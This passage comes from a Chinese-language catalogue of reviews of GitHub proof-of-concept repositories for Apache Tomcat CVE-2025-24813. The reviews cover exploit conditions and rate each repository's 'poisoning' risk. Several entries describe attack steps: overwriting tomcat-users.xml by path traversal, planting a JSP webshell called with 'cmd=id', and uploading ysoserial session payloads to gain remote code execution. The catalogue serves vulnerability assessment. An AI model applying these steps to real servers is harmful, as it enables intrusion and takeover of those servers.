**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足以下条件：
  1. 默认Servlet的写入已启用（默认禁用）。
  2. 支持部分PUT（默认启用）。
  3. 存在安全敏感上传的目标URL，该URL是公共上传目标URL的子目录。
  4. 攻击者知道要上传的安全敏感文件的名称。
  5. 安全敏感文件也通过部分PUT上传。
或者，如果满足以下条件，则恶意用户可以执行远程代码执行：
  1. 默认Servlet的写入已启用（默认禁用）。
  2. 支持部分PUT（默认启用）。
  3. 应用程序正在使用Tomcat的基于文件的会话持久性，并使用默认存储位置。
  4. 应用程序包含一个可以在反序列化攻击中使用的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，结合默认Servlet的写入启用和部分PUT支持，攻击者可以通过构造特殊的上传路径，覆盖或修改服务器上的敏感文件，造成信息泄露或恶意代码执行。该漏洞还涉及反序列化利用链，如果应用程序满足特定条件，攻击者可以利用Tomcat的文件会话管理机制和应用程序中的反序列化漏洞来执行任意代码。

**有效性分析：**

提供的PoC代码通过检查以下几点来验证漏洞的有效性：

1.  **PUT方法允许性：** 检查目标URL是否允许PUT请求，这是利用该漏洞的前提。
2.  **Tomcat版本检测：** 检查目标服务器的Tomcat版本，确认其是否在受影响的范围内。
3.  **写入权限检查：** 尝试在目标URL的/uploads/目录下写入一个JSP文件，以验证是否具有写入权限。

如果以上三个条件都满足，则目标服务器可能存在CVE-2025-24813漏洞。

**投毒风险分析：**

检查了提供的Python脚本，发现它主要用于检测目标服务器是否存在CVE-2025-24813漏洞，脚本尝试上传JSP文件以验证写入权限。因此，存在很小的投毒风险，代码的功能主要是检测和验证漏洞，而非利用漏洞执行恶意操作，上传的JSP payload也是用于验证，而不是直接执行恶意代码. 但是依然存在服务器被动植入后门webshell的风险。

**利用方式：**

根据漏洞描述，利用方式主要包括以下两种：

1.  **信息泄露/文件篡改：**

   *   攻击者通过构造包含`.Name`（内部点）的恶意文件名，利用路径等价性绕过安全检查。
   *   利用部分PUT请求，将恶意内容注入到安全敏感文件中，或者直接覆盖文件。
   *   目标URL需要是公共上传URL的子目录，且攻击者需要知道敏感文件名。

2.  **远程代码执行：**

   *   攻击者需要找到应用程序中可利用的反序列化漏洞。
   *   利用Tomcat的文件会话管理，将包含恶意反序列化payload的文件上传到会话存储目录。
   *   当Tomcat加载会话数据时，触发反序列化，执行任意代码。

成功利用此漏洞需要满足多个条件，包括Tomcat配置、应用程序环境以及攻击者的知识。

**项目地址:** [horsehacks/CVE-2025-24813-checker](https://github.com/horsehacks/CVE-2025-24813-checker)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #33

**来源**: [CVE-2025-24813-iSee857_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-iSee857_CVE-2025-24813-PoC.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 ~ 11.0.2, 10.1.0-M1 ~ 10.1.34, 9.0.0.M1 ~ 9.0.98

**利用条件:** 默认Servlet写入已启用，支持部分PUT已启用，目标URL是公共上传URL的子目录, 攻击者需要知道上传的安全敏感文件的名称，安全敏感文件也通过部分PUT上传；或者应用程序使用 Tomcat 基于文件的会话持久性，默认存储位置，应用程序包含一个可以在反序列化攻击中使用的库

**POC 可用性:** 是

**投毒风险:** 100%

## 详情

根据漏洞库信息和搜索结果，CVE-2025-24813 涉及 Apache Tomcat 的路径等价问题，可能导致远程代码执行、信息泄露或恶意内容注入。漏洞利用依赖于多个条件，包括默认Servlet写入已启用，支持部分PUT请求，以及特定的文件存储配置。搜索结果 "One PUT Request to Own Tomcat: CVE-2025-24813 RCE is in the Wild/" 表明该漏洞可能已在野外被利用，提高了其风险级别。提供的PoC代码是一个批量检测脚本，通过发送恶意PUT请求来验证目标是否存在漏洞。由于PoC中包含未经审查的base64解码payload, 存在极高的投毒风险，攻击者可能修改payload指向恶意地址，执行任意代码,因此投毒风险为100%。

**利用方式：**
1.  **信息泄露/恶意内容注入：** 如果满足条件 writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT，则可以查看安全敏感文件和/或将内容注入到这些文件中。
2.  **远程代码执行：** 如果满足条件 writes enabled for the default servlet, support for partial PUT, application was using Tomcat's file based session persistence with the default storage location, application included a library that may be leveraged in a deserialization attack，则可利用反序列化漏洞执行远程代码。
3.  **PoC 利用：** PoC脚本首先解析目标URL，然后发送精心构造的PUT请求到目标服务器。如果服务器存在漏洞，并且满足利用条件，攻击者可以实现远程代码执行或信息泄露。

**项目地址:** [iSee857/CVE-2025-24813-PoC](https://github.com/iSee857/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #34

**来源**: [CVE-2025-24813-imbas007_CVE-2025-24813-apache-tomcat.md](../2025/CVE-2025-24813-imbas007_CVE-2025-24813-apache-tomcat.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence-RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露以及服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要 writes enabled for the default servlet (默认禁用), support for partial PUT (默认启用), application 使用 Tomcat 的基于文件的 session 持久化，默认存储位置, application 包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞。攻击者可以利用此漏洞绕过安全限制，通过精心设计的目录遍历序列覆盖关键配置文件，部署 web shell，并可能实现远程代码执行 (RCE)。

**有效性：**
提供的 Nuclei 模板（CVE-2025-24813.yaml）似乎有效。它包含三个请求：
1.  **PUT 请求覆盖 tomcat-users.xml：** 用于创建一个新的管理员用户，从而允许未经授权的访问。
2.  **PUT 请求部署 JSP Web Shell：** 用于在服务器上部署一个简单的 Web Shell，允许执行任意命令。
3.  **GET 请求执行 `id` 命令：**  用于验证 Web Shell 是否已成功部署并且可以执行命令。

该模板使用匹配器来验证请求是否成功，并提取相关信息。`README.md` 文件还提供了关于如何使用该模板和执行 Web Shell 的说明。

**投毒风险：**
虽然 POC 代码本身的目的在于利用漏洞，但其中潜在的投毒风险较低（约 5%）。风险主要存在于以下几个方面：
1.  **Web Shell 功能：** Web Shell 允许执行任意命令，如果攻击者在测试环境之外使用它，可能会造成恶意行为。虽然提供的 Web Shell 相对简单，但攻击者可以修改它以包含恶意功能，例如下载和执行其他恶意软件。
2.  **配置文件覆盖：** 覆盖 `tomcat-users.xml` 文件虽然是利用漏洞的一部分，但如果攻击者使用恶意配置替换该文件，可能会导致服务器不稳定或更容易受到其他攻击。
3.  **第三方依赖：** Nuclei 模板本身依赖于 Nuclei 工具。如果 Nuclei 工具被篡改，则可能存在其他风险。

总体而言，直接投毒的风险较低，因为代码主要集中在利用已知漏洞上。然而，通过 Web Shell 执行恶意操作的可能性仍然存在。

**利用方式：**
利用 CVE-2025-24813 漏洞的步骤如下：
1.  **利用路径等价漏洞：** 攻击者利用 Tomcat 默认 servlet 处理文件上传时存在的路径等价漏洞。通过在文件名中使用 ".." 序列，攻击者可以绕过目录限制，将文件上传到 Tomcat 配置目录或 Web 应用程序的根目录。
2.  **覆盖 `tomcat-users.xml` 文件：** 攻击者使用 PUT 请求将包含恶意用户的 `tomcat-users.xml` 文件上传到 `../conf/` 目录。此文件覆盖现有的 `tomcat-users.xml` 文件，从而创建一个具有管理员权限的新用户。
3.  **部署 Web Shell：** 攻击者使用 PUT 请求将 JSP Web Shell 文件上传到 Web 应用程序的根目录（`../webapps/ROOT/`）。此 Web Shell 允许攻击者在服务器上执行任意命令。
4.  **执行任意命令：** 攻击者使用浏览器访问 Web Shell 的 URL，并通过 `cmd` 参数执行任意命令。例如，`http://target.com/updates.jsp?cmd=id` 命令将显示服务器的用户 ID 信息。

**需要注意的是，默认情况下，Tomcat 的 default servlet 的写入是禁用的，需要手动启用。** 除此之外，如果启用了基于文件的 session 持久化，并且应用包含了可用于反序列化攻击的库，则可以通过上传恶意的 session 文件来实现 RCE。

攻击者可以通过上传恶意文件，执行任意代码，并完全控制受影响的 Tomcat 服务器。

**项目地址:** [imbas007/CVE-2025-24813-apache-tomcat](https://github.com/imbas007/CVE-2025-24813-apache-tomcat)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #35

**来源**: [CVE-2025-24813-issamjr_CVE-2025-24813-Scanner.md](../2025/CVE-2025-24813-issamjr_CVE-2025-24813-Scanner.md)

## CVE-2025-24813 - Apache Tomcat Path Equivalence / Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 to 9.0.98, 10.1.0-M1 to 10.1.34, 11.0.0-M1 to 11.0.2

**利用条件:** 需要满足多个条件，包括：默认Servlet的写入启用（默认禁用），支持partial PUT（默认启用），特定的目录结构，攻击者需要了解敏感文件名，应用使用Tomcat的文件会话持久性（默认位置）并且包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个高危漏洞，涉及路径等价性（内部点）问题，可能导致远程代码执行（RCE）、信息泄露或恶意内容添加到上传的文件。该漏洞利用了Tomcat对包含内部点的文件名处理不当，结合启用的Default Servlet写入功能和Partial PUT支持。如果攻击者能够满足所有前提条件，则可以上传恶意JSP文件或通过反序列化漏洞执行任意代码。从github仓库提供的python脚本来看，该脚本只是检测是否存在漏洞，并不能实现真正的利用。该仓库存在一定的投毒风险，可能性为10%， 主要体现在作者可能在后续版本中添加恶意代码，例如反弹shell或植入后门等，但当前提供的版本并未发现明显的恶意行为。

**项目地址:** [issamjr/CVE-2025-24813-Scanner](https://github.com/issamjr/CVE-2025-24813-Scanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #36

**来源**: [CVE-2025-24813-maliqto_PoC-CVE-2025-24813.md](../2025/CVE-2025-24813-maliqto_PoC-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** Default Servlet 开启写入 (默认关闭), 支持Partial PUT (默认开启), 应用使用Tomcat的文件Session持久化存储(默认位置), 存在可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个高危漏洞，源于路径等价（Path Equivalence）问题和不安全的反序列化。

**漏洞利用方式：**

1.  **路径等价和信息泄露/恶意内容注入：** 如果 Tomcat 启用了 Default Servlet 的写入功能（`writes enabled for the default servlet`），并支持 partial PUT（`support for partial PUT`），且存在一个安全敏感文件上传的目标 URL 是公共上传 URL 的子目录，攻击者知晓敏感文件名，并使用 partial PUT 上传，则攻击者可能能够查看敏感文件或向其中注入恶意内容。
2.  **反序列化导致远程代码执行：** 如果 Tomcat 启用了 Default Servlet 的写入功能，支持 partial PUT，且应用程序使用了 Tomcat 的基于文件 Session 持久化存储（使用默认存储位置），并且应用程序包含一个可以用于反序列化攻击的库，那么攻击者可能执行远程代码。

**POC 有效性：**

提供的 POC 代码 `poc-cve.py`  是一个 Python 脚本，用于检测和利用 CVE-2025-24813 漏洞。它包含以下功能：

*   检测 Default Servlet 是否可写（通过 PUT 方法）。
*   生成 ysoserial payload 用于反序列化攻击。
*   通过 PUT 方法上传恶意 payload 到 session 文件，从而触发反序列化漏洞。

根据漏洞信息和 POC 代码，此 POC 具备有效性，可以在满足漏洞利用条件的环境中实现远程代码执行。

**投毒风险分析：**

仔细检查了提供的 Python 脚本 `poc-cve.py` 和 `README.md`。代码主要用于生成和上传恶意 payload，利用反序列化漏洞执行命令。以下是风险评估：

*   **高风险部分**  使用了 `ysoserial.jar`，如果下载源被篡改，可能会引入恶意代码。但脚本本身只是调用 `ysoserial.jar`，并没有直接包含恶意逻辑。
*   **潜在风险** 脚本在生成 payload 过程中，如果 `ysoserial.jar`  被替换为恶意版本，或者脚本中的命令注入点被恶意修改，可能导致投毒。
*   **低风险部分**  脚本中包含删除临时文件的函数 `remove_file`，这有助于清理攻击痕迹，本身不属于投毒行为。

综合评估，该仓库存在一定的投毒风险，主要集中在 ysoserial 的依赖和命令注入的可能性上。考虑到代码的整体结构和目的，以及作者声明的教育目的，直接包含恶意代码的可能性较低。风险评估百分比为10%。主要是考虑到使用者可能会误用或在不安全的环境中使用。

**总结：**

CVE-2025-24813 是一个需要多种条件才能触发的漏洞。 POC 实现了漏洞利用，但存在一定的投毒风险，主要是依赖外部工具 `ysoserial` 且需要谨慎使用。


**项目地址:** [maliqto/PoC-CVE-2025-24813](https://github.com/maliqto/PoC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #37

**来源**: [CVE-2025-24813-manjula-aw_CVE-2025-24813.md](../2025/CVE-2025-24813-manjula-aw_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露和文件篡改

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：1. 启用了DefaultServlet的写入功能（默认禁用）；2. 启用了partial PUT支持（默认启用）；3. 对于RCE，需要应用程序使用Tomcat基于文件的会话持久化，并且包含可用于反序列化攻击的库；对于信息泄露和文件篡改，攻击目标URL是公共上传URL的子目录，且攻击者知道要上传的敏感文件名称,并且敏感文件也通过partial PUT上传。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，利用 'file.Name' (Internal Dot) 导致远程代码执行（RCE）和/或信息泄露和/或通过写入启用的 Default Servlet 将恶意内容添加到上传的文件中。根据漏洞描述和搜索结果，此漏洞利用需要特定配置才能成功。利用方式涉及通过 partial PUT 请求上传恶意构造的文件。提供的POC代码包含三个主要脚本：`01-prepare-environment.sh` 用于配置Tomcat环境，包括启用 DefaultServlet 的写入功能、配置会话持久化（RCE所需），以及下载必要的依赖（ysoserial和commons-collections）；`03-test.sh` 用于构造和发送包含恶意payload的PUT请求，使用ysoserial生成payload，利用CommonsCollections5链执行命令 `touch /tmp/pwndtomcat`。漏洞利用的关键在于 `Content-Range` 头部，该头部用于执行 partial PUT 请求，从而允许攻击者利用路径等价漏洞。该脚本通过修改Content-Range头部中的长度字段，来绕过一些安全检查，实现恶意payload的上传和执行。

**有效性：** 提供的POC代码有效，如果目标环境满足漏洞利用的先决条件（启用了DefaultServlet的写入功能，支持partial PUT，以及特定的部署配置），则可以成功利用该漏洞进行RCE或文件篡改/信息泄露。

**投毒风险：** 经过对POC代码的分析，未发现明显的投毒代码。该POC的目的是重现和利用CVE-2025-24813漏洞。脚本的行为符合漏洞利用的预期步骤，没有发现作者隐藏的恶意行为。所有操作都与漏洞利用直接相关。因此，投毒风险评估为0%。

**利用方式：**
1.  **环境准备：** 使用 `01-prepare-environment.sh` 脚本配置Tomcat环境，使其满足漏洞利用的先决条件（例如，启用写入的DefaultServlet，配置基于文件的会话管理）。
2.  **Payload生成：** 使用 `ysoserial` 工具生成恶意序列化 payload。  该 payload 会在目标服务器上执行任意命令。
3.  **Partial PUT 请求：**  使用 `03-test.sh` 脚本，通过精心构造的带有 `Content-Range` 头的 HTTP PUT 请求将 payload 发送到 Tomcat 服务器。 `Content-Range` 头的构造是利用漏洞的关键步骤。 
4.  **RCE/信息泄露/文件篡改：**  如果一切顺利，Tomcat 服务器会反序列化恶意 payload，导致在服务器上执行任意代码（RCE）或修改服务器上的文件，导致信息泄露或文件篡改。

**项目地址:** [manjula-aw/CVE-2025-24813](https://github.com/manjula-aw/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #38

**来源**: [CVE-2025-24813-mbanyamer_Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-.md](../2025/CVE-2025-24813-mbanyamer_Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-.md)

## CVE-2025-24813-Apache Tomcat-RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可完全控制服务器

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 默认Servlet开启写入(disabled by default), 支持Partial PUT(默认开启), 使用Tomcat文件Session持久化默认位置，应用包含可用于反序列化的库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，通过构造包含内部点（例如 file.Name）的文件名，结合启用的默认Servlet写入和部分PUT支持，可能导致远程代码执行和/或信息泄露。POC利用方式如下：

1.  **检查先决条件：** 检查目标Tomcat实例是否满足利用条件：默认Servlet的写入是否开启，Partial PUT是否支持（默认开启），是否使用了基于文件的Session持久化，以及是否包含可利用的反序列化库。
2.  **构造恶意Payload：** 使用 ysoserial 工具生成恶意的序列化 Java Payload，该 Payload 包含要执行的命令。
3.  **上传Payload：** 通过 PUT 请求将Payload上传到Tomcat服务器的Session存储目录。利用路径遍历(../)绕过上传限制，将恶意Session文件上传到 `uploads/../sessions/` 目录下.
4.  **触发反序列化：**  向服务器发送包含特定Session ID的请求，触发Tomcat加载恶意的Session文件，导致反序列化漏洞被触发，执行Payload中的命令。
5. **验证和清理：** 验证命令是否成功执行，并清理上传的恶意Session文件。

**有效性评估：**
根据漏洞库信息、搜索结果以及漏洞利用代码，可以判断该漏洞利用代码是有效的。搜索结果显示该漏洞已被积极利用。

**投毒风险评估：**
仔细分析了提供的POC代码，没有发现作者有意隐藏的投毒代码。代码逻辑清晰，功能明确，主要是利用ysoserial生成payload，然后通过PUT请求上传，最后触发。



**项目地址:** [mbanyamer/Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-](https://github.com/mbanyamer/Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #39

**来源**: [CVE-2025-24813-michael-david-fry_Apache-Tomcat-Vulnerability-POC-CVE-2025-24813.md](../2025/CVE-2025-24813-michael-david-fry_Apache-Tomcat-Vulnerability-POC-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价 / 反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露或恶意内容注入

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 对于RCE：Default Servlet 开启写入，支持Partial PUT，使用了Tomcat文件session持久化默认位置，存在可利用的反序列化库。对于信息泄露/内容注入：Default Servlet 开启写入，支持Partial PUT，存在敏感文件上传目录是公共上传目录的子目录，攻击者已知敏感文件名，使用Partial PUT上传敏感文件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，涉及路径等价（'file.Name' 中的内部点）可能导致远程代码执行 (RCE)、信息泄露，或通过启用写入的默认Servlet向上传的文件添加恶意内容。漏洞存在于多个Tomcat版本：9.0.0.M1到9.0.98，10.1.0-M1到10.1.34，以及11.0.0-M1到11.0.2。

根据漏洞描述，如果Default Servlet启用了写入（默认禁用），支持Partial PUT（默认启用），并且应用程序使用了Tomcat的基于文件的会话持久化以及默认存储位置，同时应用程序包含可用于反序列化攻击的库，则可能导致RCE。另外，如果Default Servlet启用了写入，支持Partial PUT，并且存在安全敏感文件上传的目标URL是公共上传目标URL的子目录，攻击者已知安全敏感文件的名称，并且安全敏感文件也是通过partial PUT上传，攻击者可以查看安全敏感文件或向其中注入内容。

提供的PoC代码 (CVE-2025-24813.py) 旨在执行非侵入性检查，以验证目标服务器是否容易受到攻击。它首先尝试从HTTP Server标头中提取Tomcat版本。然后，它尝试通过HTTP PUT在目标上创建一个名为“CVE-2025-24813-check.txt”的文件，如果成功，则删除该文件。这用于确定DefaultServlet是否已启用写入。最后，它尝试检索会话ID。该脚本接受CSV文件作为输入，并在报告文件中记录所有操作。

**有效性：** 根据搜索结果，CVE-2025-24813已被利用，这表明该漏洞确实存在，并且可以被利用。提供的PoC代码主要用于检测漏洞的存在，而不是直接利用RCE或信息泄露。

**投毒风险：** PoC代码中，主要功能是进行版本检测和判断DefaultServlet是否开启写入权限。在提供的代码片段中，没有明显的恶意代码。但是仍存在一定的风险（估计为10%），例如：

1.  **依赖项风险：** 脚本使用了 `requests` 库，如果该库本身被篡改（例如通过PyPI投毒），可能会引入恶意代码。
2.  **报告文件：**  报告文件可能包含敏感信息，如果报告文件被上传到公共位置，可能导致信息泄露。
3.  **脚本维护者风险：** 如果脚本的维护者受到恶意攻击或者本身就是恶意用户，可能会在后续版本中添加恶意代码。

**利用方式：**

1.  **RCE (远程代码执行):**  攻击者需要满足多个条件，包括Default Servlet开启写入，支持Partial PUT，使用了Tomcat文件session持久化默认位置，存在可利用的反序列化库。攻击者利用Partial PUT上传恶意序列化数据到Tomcat的session文件，从而执行任意代码。
2.  **信息泄露/内容注入：**  攻击者需要满足多个条件，包括Default Servlet开启写入，支持Partial PUT，存在敏感文件上传目录是公共上传目录的子目录，攻击者已知敏感文件名，使用Partial PUT上传敏感文件。攻击者利用Partial PUT覆盖或修改敏感文件。

总的来说，该漏洞的利用需要特定配置和条件，提供的PoC主要用于初步检测，实际利用需要更复杂的攻击步骤。

**项目地址:** [michael-david-fry/Apache-Tomcat-Vulnerability-POC-CVE-2025-24813](https://github.com/michael-david-fry/Apache-Tomcat-Vulnerability-POC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #40

**来源**: [CVE-2025-24813-msadeghkarimi_CVE-2025-24813-Exploit.md](../2025/CVE-2025-24813-msadeghkarimi_CVE-2025-24813-Exploit.md)

## CVE-2025-24813 Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet开启写入 (disabled by default), 支持partial PUT (enabled by default), 使用Tomcat文件session持久化默认位置,应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是一个Apache Tomcat中的路径等价漏洞，利用内部点(file.Name)导致远程代码执行和/或信息泄露，和/或恶意内容被添加到上传的文件中，通过默认Servlet写入。根据漏洞库信息，如果满足以下条件，攻击者可以查看敏感文件或注入内容：

*   默认Servlet开启写入 (默认关闭)
*   支持Partial PUT（默认开启）
*   安全敏感上传的目标URL是公共上传目标URL的子目录
*   攻击者知道被上传的安全敏感文件的名称
*   安全敏感文件也通过Partial PUT上传

如果满足以下条件，攻击者可以执行远程代码：

*   默认Servlet开启写入 (默认关闭)
*   支持Partial PUT（默认开启）
*   应用使用Tomcat基于文件的session持久化，使用默认存储位置
*   应用包含一个可以用于反序列化攻击的库

**漏洞利用方式：**

1.  **Partial PUT上传恶意文件：** 利用Tomcat的Partial PUT功能，攻击者可以分块上传恶意文件到服务器。
2.  **路径遍历：**  通过构造包含`file.Name`（内部点）的特殊文件名，绕过路径检查，将恶意文件写入到Tomcat session存储目录，或者其他任意可写目录。
3.  **反序列化漏洞利用：** 如果应用程序包含一个可以被利用的反序列化库，上传的恶意文件可以触发反序列化漏洞，从而执行任意代码。
4.  **RCE:** 通过上传包含恶意代码的session文件,利用反序列化漏洞，实现远程代码执行。

**POC分析：**

提供的Python POC脚本尝试利用此漏洞。它执行以下步骤：

1.  **发送PUT请求：** 脚本向目标服务器发送PUT请求，尝试创建一个session文件。请求头包含Content-Length和Content-Range，模拟Partial PUT请求。
2.  **检查响应状态码：** 如果PUT请求返回409冲突状态码，表示服务器可能存在漏洞。
3.  **发送GET请求：** 脚本发送一个GET请求，其中Cookie包含一个伪造的JSESSIONID，尝试触发session反序列化。
4.  **检查响应状态码：** 如果GET请求返回500错误，表明session反序列化可能成功，漏洞可能存在。

**有效性：**

该POC代码尝试了利用该漏洞，但是否能够成功利用取决于目标服务器的具体配置和环境。需要满足上述所有条件漏洞才能成功利用。鉴于github上存在该漏洞的POC,故判断POC有效。

**投毒风险：**

该POC代码的主要目的是检测漏洞是否存在，而不是直接执行恶意操作。但是，`PAYLOAD`变量中包含一个base64编码的字符串，这可能包含一个反序列化payload。攻击者可能在`PAYLOAD`中注入恶意代码。

从代码逻辑来看，脚本首先发送一个PUT请求，如果返回409，则发送一个包含特定Cookie的GET请求。如果GET请求返回500，则认为目标存在漏洞。这个过程相对简单，没有明显的恶意行为。

但是，由于`PAYLOAD`的内容是未知的（被截断），存在一定的风险。如果`PAYLOAD`包含恶意代码，并且在目标服务器上成功执行，那么可能会导致安全问题。考虑到作者使用了看起来正常的请求参数，并且代码主要用于检测漏洞，因此判断投毒风险较低，约为10%。剩下的90%是为了验证此漏洞是否可以使用。

**项目地址:** [msadeghkarimi/CVE-2025-24813-Exploit](https://github.com/msadeghkarimi/CVE-2025-24813-Exploit)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #41

**来源**: [CVE-2025-24813-n0n-zer0_Spring-Boot-Tomcat-CVE-2025-24813.md](../2025/CVE-2025-24813-n0n-zer0_Spring-Boot-Tomcat-CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/恶意内容注入

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/恶意内容注入

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露或恶意内容被注入到上传的文件中

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入、支持partial PUT、存在特定的目录结构、攻击者需要了解敏感文件名、使用Tomcat文件会话保持且为默认存储位置、存在可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，由于Tomcat在处理包含内部点（file.Name）的文件名时存在缺陷，结合Default Servlet的写入功能，可能导致远程代码执行、信息泄露或将恶意内容添加到上传的文件中。

**漏洞利用有效性：**
根据搜索结果和漏洞库信息，CVE-2025-24813被广泛认为是可利用的，并且已经出现公开的利用方法。多个安全厂商和CERT机构发布了关于该漏洞的警告，部分报告指出该漏洞已经在野外被利用，因此该漏洞利用的有效性较高。

**投毒风险分析：**
提供的漏洞利用代码看起来像是 Maven Wrapper 脚本。Maven Wrapper 本身是一个工具，用于确保项目使用特定版本的 Maven 构建工具。这个脚本的功能是下载和执行指定版本的 Maven。因此，直接在这个脚本中进行投毒相对困难。但是，仍然存在一些潜在的投毒风险点：

1.  **distributionUrl篡改：** 攻击者可以修改 `.mvn/wrapper/maven-wrapper.properties` 文件中的 `distributionUrl` 属性，将其指向一个恶意的 Maven 发行版。这个恶意的 Maven 发行版可能包含后门或恶意代码，当开发者或构建系统使用 Maven Wrapper 构建项目时，就会执行这些恶意代码。
2.  **伪造 Maven 仓库：** 攻击者可以搭建一个伪造的 Maven 仓库，拦截 Maven Wrapper 下载 Maven 发行版的请求。这个伪造的 Maven 仓库可以返回一个包含后门的 Maven 发行版。

考虑到 Maven Wrapper 脚本本身的性质，以及通常会对下载的 Maven 发行版进行校验，直接投毒的概率较低，估计在5%左右。但也不能完全排除，因为攻击者可以通过社会工程学等手段诱导用户使用被篡改的 `distributionUrl`。

**漏洞利用方式：**
根据漏洞描述，漏洞利用方式取决于满足的条件：

1.  **信息泄露/恶意内容注入：** 如果满足以下所有条件：
    *   Default Servlet 开启写入功能。
    *   支持 partial PUT 请求。
    *   存在一个公共上传目录的子目录，作为安全敏感文件的目标 URL。
    *   攻击者了解安全敏感文件的名称。
    *   安全敏感文件也通过 partial PUT 上传。
    攻击者可以利用路径等价漏洞读取敏感文件或向其中注入恶意内容。

